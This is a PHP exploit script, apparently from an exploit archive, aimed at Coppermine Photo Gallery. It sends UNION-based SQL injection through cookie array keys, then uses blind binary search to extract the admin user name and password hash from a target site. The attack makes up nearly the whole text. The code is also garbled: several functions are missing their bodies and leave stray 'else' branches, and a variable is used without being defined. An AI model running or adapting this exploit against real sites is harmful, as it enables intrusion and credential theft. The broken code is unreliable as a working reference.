Coppermine Photo Gallery <= 1.4.14 Remote SQL Injection Exploit
===============================================================



<?php
#############################################
# RST/GHC PRIVATE 
# CPG 1.4.10 sql injection exploit
# Date: 17.05.07
# bug: SQL injection in private album
# function through array indexes with COOKIE 
#############################################
error_reporting (E_ERROR);
ini_set("max_execution_time",0);
intro();
if ($argc < 4 ){
        print "        <host>                          - hostname\n";           
        print "        <dir>                           - web dirname \n";           
        print "        <force>                         - force mode - &#039;0&#039; - for Off or \"album number\" for force mode On \n";           
        print " example: " . $argv[0] . " coppermine.site photo/ 1 cpg1410\n";
        credits();
}
###############################################
/* FUNCTIONS */
##############################################

if (!function_exists(str_split)){ ### for PHP4 << FIX
        function str_split($str)
      {
        $str_array=array(); 
        $len=strlen($str);
        for($i=0;$i<$len;$i++) $str_array[]=$str{$i};
        return $str_array;
       }
}

function toSql($str){
        $a_str = str_split ($str);
        $s_str = &#039;0x&#039;;
        foreach ($a_str as $val){
                $s_str .= sprintf("%X",ord($val));
        }
        return $s_str;
}

function toCookie ($str){
        $str = "-1) UNION SELECT " .toSql ($str). ",1 as md5_password/*";
        $c_str=array(0=>"8", $str=>"1");
        return $c_str;
}


function getAlbum($text){
                return intval($match[0]); 
        }
         else return 0;

}

function getCookie($text){
        else {$cookie = &#039;&#039;;}
        return $cookie; 
}

function getPrefix($text){
        else return false;
}

function toPage($page){
 $pattern = "/(?<=HTTP).*(?=<html)/s";
 $replacement = &#039;&#039;;
 /* Let&#039;s count images on the page */
 else return 0;
}

function sendit($page, $method, $cookie=&#039;&#039;){
global $argv;
        $data =&#039;&#039;;
        $host = $argv[1];
        $page = $argv[2] . $page;
        $referer = &#039;http://&#039;.$host;
    $user_agent = &#039;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#039;;
    $result = &#039;&#039;;        
        $sock = fsockopen($host, 80, $errno, $errstr, 50);
        if (!$sock) die("$errstr ($errno)\n");
        fputs($sock, "$method /$page HTTP/1.0\r\n");
        fputs($sock, "Host: $host" . "\r\n");
        fputs($sock, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($sock, "Content-length: " . strlen($data) . "\r\n");
        fputs($sock, "Referer: $referer". "\r\n");
        fputs($sock, "User-Agent:  $user_agent" . "\r\n");        
        fputs($sock, "Accept: */*\r\n");
        if ($cookie !==&#039;&#039;) {fputs($sock, "Cookie: $cookie\r\n");}
        fputs($sock, "\r\n");
        fputs($sock, "$data\r\n");
        fputs($sock, "\r\n");

    while (!feof($sock)) {
        $result .= fgets ($sock,8192);
    }           
        fclose($sock);
                //print $result; ### DEBUGER
    return $result; 
    
}

function credits(){
echo &#039;
+==========================================+
+ Coded: 17.05.07 * Bug found in Feb.2007  +
+==========================================+
&#039;; 
exit;
}


function intro(){
echo &#039;
          * P R I V A T E  *
+==========================================+
| RST/GHC Coppermine SQL injection exploit |
+==========================================+
|  >>> vulnerable: CPG 1.4.10 stable  <<<  |
+------------------------------------------+
&#039;;

}

#####################################################################
### HACK FUNCTIONS
#####
####
### what to find:
## user_name   user_password    FROM  cpg1410_users WHERE user_id=1
####################################################################

function makeExpl($param, $cond, $sn) ### $param - name || password; $cond - condition (e.g. =97) ; $sn  - position 
{
        global $argv;
        $sql = &#039;0) UNION SELECT &#039;.$GLOBALS[&#039;album&#039;].&#039; AND &#039; .$query. &#039;/*&#039;; 
           //echo $sql; ###DEBUG
        return toCookie($sql);

}
//////////////
function blind($param, $sn, $fmin, $fmax)
{
 if (($fmax-$fmin)<5) { return crack($param, $fmin, $fmax, $sn) ;}
 $compare = intval($fmin + ($fmax-$fmin)/2);
 $crcheck = ">". $compare;
 if ( check(makeExpl($param, $crcheck, $sn)) == 1 ) {
    return blind($param, $sn, $compare, $fmax);
    }
 else {
    return blind($param, $sn, $fmin, $compare+1); 
        }
}

function crack($param, $cmin, $cmax, $sn)
{
 for ($i=$cmin; $i <=$cmax; $i++){
   $crcheck = &#039;=&#039;.$i;
   $sqlCookie = makeExpl($param, $crcheck ,$sn);
   if (check($sqlCookie) == 1){print chr($i); return 1;}
         }
return 0;
}

function check($sqlCookie){
        global $page, $etalon;
        $testPage = toPage(sendit ($page, &#039;GET&#039;, $sqlCookie));
        if ($testPage < $etalon) return 1;
        else return 0;
}

function exploit($param){ 
        echo "\nLet&#039;s define admin&#039;s ". $param . "\n";
        $min = 48;  # 0
        $max = 122; # z

        $sql_cookies = makeExpl($param,&#039;BETWEEN &#039;.$min . &#039; AND &#039;.$max,1);
        if (check($sql_cookies) == 0) {echo &#039;failed...&#039;; return;}

        $sn=1; 
        while(blind($param,$sn, $min, $max) !== 0) {
                $sn++; if ($sn > 32) return;
        }
}

###############################################################
## START     E X P L O I T    C O D E 
#############################################################
echo &#039;
Exploiting:
[+] target: &#039;. $argv[1].&#039;/&#039;.$argv[2].&#039;
&#039;;
         $page = &#039;&#039;;
        $firstReply = sendit($page, &#039;GET&#039;); 
        $album = getAlbum($firstReply);                                                                  ### get valid album number
        if ($album == 0) {
                echo "[-] No valid album found...\n"; 
                if ($argv[3] != 0) {echo "... Forcing\n";        $album = $argv[3];}        ### FOR FORCE MODE!!!! If you know exactly album number - put it here
                else {credits();}                                                                                 
                
        }
        $page = &#039;thumbnails.php?album=&#039;.$album;
        $GLOBALS[&#039;album&#039;] = $album;
        echo "[+] Valid album number: ".$album . "\n";
        
        $GLOBALS[&#039;cookies&#039;] = getCookie($firstReply);                                         ### get cookie from host

        
        $etalon = toPage(sendit ($page, &#039;GET&#039;, $c_cookies));                         ### number of images at etalon page
        
        $first_sql = &#039;0) UNION SELECT &#039;.$album.&#039; AND 1=1/*&#039;;                        ### FIRST sql query - let&#039;s make valid album to be invisible
        $first_cookie = toCookie($first_sql);
        
        if (check($first_cookie) == 0) {echo "exploit failed..."; credits();} ### if album is still visible - site is unvulnerable
        exploit(&#039;name&#039;);
        exploit(&#039;password&#039;);
        credits();

?>



